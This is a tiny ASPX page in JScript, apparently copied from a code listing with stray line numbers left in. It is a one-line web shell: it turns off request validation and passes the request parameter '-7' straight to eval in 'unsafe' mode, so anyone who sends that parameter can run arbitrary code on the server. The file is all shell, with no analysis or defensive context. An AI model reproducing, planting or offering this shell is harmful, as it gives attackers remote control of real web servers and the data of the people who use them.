<%@ Page Language="Jscript" validateRequest="false" %>
2
<%
3
var keng
4
keng = Request.Item["-7"];
5
Response.Write(eval(keng,"unsafe"));
6
%>
